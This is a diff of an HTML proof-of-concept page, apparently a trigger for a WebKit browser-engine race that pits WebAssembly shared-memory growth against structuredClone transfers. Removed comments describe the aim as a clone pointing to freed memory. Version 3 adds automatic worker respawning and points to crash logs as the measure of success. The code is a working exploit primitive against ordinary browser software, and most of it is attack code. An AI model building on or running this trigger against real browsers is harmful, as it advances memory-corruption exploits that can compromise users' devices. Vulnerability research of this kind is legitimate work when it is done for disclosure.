@@ -3,20 +3,21 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>P2 Deterministic Trigger v2</title>
+<title>P2 Trigger v3</title>
 <style>
 body { background:#000; color:#0f0; font-family:monospace; font-size:12px; margin:0; padding:8px; }
 #log { white-space:pre-wrap; word-break:break-all; }
 </style>
 </head>
 <body>
-<div id="log">P2 v2 loading...</div>
+<div id="log">P2 v3 loading...</div>
 <script>
 (function(){
 "use strict";
 
 var LOG = document.getElementById('log');
 var t0 = Date.now();
+var resetCount = 0;
 
 function log(msg) {
   var line = '[' + ((Date.now()-t0)/1000).toFixed(3) + 's] ' + msg;
@@ -27,13 +28,7 @@ document.addEventListener('visibilitychange', function() {
   if(document.hidden) log('!!! PAGE HIDDEN — RUN DEAD !!!');
 });
 
-log('P2 v2: building shared WASM memory...');
-
-var SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});
-
-log('P2 v2: memory built, byteLength=' + SHARED_MEM.buffer.byteLength);
-
-// Grow worker: hammers mem.grow() to trigger refreshAfterWasmMemoryGrow race
+// Grow worker: hammers mem.grow(), resets when hitting max
 var growSrc = [
   'onmessage = function(e) {',
   '  var mem = e.data;',
@@ -45,7 +40,7 @@ var growSrc = [
   '      n++;',
   '      if(n % 100 === 0) postMessage({type:"grow", n:n});',
   '    } catch(err) {',
-  '      postMessage({type:"growerr", msg:err.message});',
+  '      postMessage({type:"reset", msg:"grow hit max"});',
   '      return;',
   '    }',
   '    setTimeout(grow, 0);',
@@ -54,8 +49,8 @@ var growSrc = [
   '};'
 ].join('\n');
 
-// Clone worker: structuredClone with transfer — races against grow
-// No Object.defineProperty — pure race between transfer and grow
+// Clone worker: copies slice to regular ArrayBuffer, then structuredClone with transfer
+// This hits the same serializer code path without transferring shared memory
 var cloneSrc = [
   'onmessage = function(e) {',
   '  var mem = e.data;',
@@ -65,9 +60,10 @@ var cloneSrc = [
   '    try {',
   '      var ab = mem.buffer;',
   '      var ta = new Uint8Array(ab);',
-  '      // Transfer detaches ab — grow reallocates backing store',
-  '      // If they overlap: cloned ArrayBufferContents points to freed memory',
-  '      structuredClone(ta, {transfer: [ab]});',
+  '      // Copy to regular ArrayBuffer — transferable, hits serializer',
+  '      var copy = new ArrayBuffer(65536);',
+  '      new Uint8Array(copy).set(ta.subarray(0, 65536));',
+  '      structuredClone(new Uint8Array(copy), {transfer: [copy]});',
   '      n++;',
   '      if(n % 10 === 0) postMessage({type:"clone", n:n});',
   '    } catch(err) {',
@@ -84,32 +80,46 @@ var cloneBlob = new Blob([cloneSrc], {type:'application/javascript'});
 var growURL = URL.createObjectURL(growBlob);
 var cloneURL = URL.createObjectURL(cloneBlob);
 
-var growWorker = new Worker(growURL);
-var cloneWorker = new Worker(cloneURL);
+var SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});
+var growWorker = null;
+var cloneWorker = null;
 
-growWorker.onmessage = function(e) {
-  if(e.data.type === 'spawn') log('SPAWN: ' + e.data.msg);
-  if(e.data.type === 'grow') log('grow n=' + e.data.n);
-  if(e.data.type === 'growerr') log('GROW ERROR: ' + e.data.msg);
-};
+function spawnWorkers() {
+  growWorker = new Worker(growURL);
+  cloneWorker = new Worker(cloneURL);
 
-cloneWorker.onmessage = function(e) {
-  if(e.data.type === 'spawn') log('SPAWN: ' + e.data.msg);
-  if(e.data.type === 'clone') log('clone n=' + e.data.n);
-  if(e.data.type === 'cloneerr') log('CLONE ERROR: ' + e.data.msg);
-};
+  growWorker.onmessage = function(e) {
+    if(e.data.type === 'spawn') log('SPAWN: ' + e.data.msg);
+    if(e.data.type === 'grow') log('grow n=' + e.data.n);
+    if(e.data.type === 'reset') {
+      resetCount++;
+      log('RESET #' + resetCount + ': ' + e.data.msg);
+      // Respawn with fresh memory
+      growWorker.terminate();
+      cloneWorker.terminate();
+      SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});
+      spawnWorkers();
+    }
+  };
 
-log('P2 v2: spawning workers...');
+  cloneWorker.onmessage = function(e) {
+    if(e.data.type === 'spawn') log('SPAWN: ' + e.data.msg);
+    if(e.data.type === 'clone') log('clone n=' + e.data.n);
+    if(e.data.type === 'cloneerr') log('CLONE ERROR: ' + e.data.msg);
+  };
 
-growWorker.postMessage(SHARED_MEM);
-cloneWorker.postMessage(SHARED_MEM);
+  growWorker.postMessage(SHARED_MEM);
+  cloneWorker.postMessage(SHARED_MEM);
+}
 
-log('P2 v2: workers spawned, waiting for race...');
+log('P2 v3: spawning workers...');
+spawnWorkers();
 
-// Monitor for crash — if we get here after 30s, the race didn't fire
+log('P2 v3: workers spawned, waiting for race...');
+
 setTimeout(function() {
-  log('P2 v2: 30s elapsed, no crash — race did not fire');
-  log('P2 v2: check Analytics for WebKit.WebContent crash logs');
+  log('P2 v3: 30s elapsed, resets=' + resetCount);
+  log('P2 v3: check Analytics for WebKit.WebContent crash logs');
 }, 30000);
 
 })();
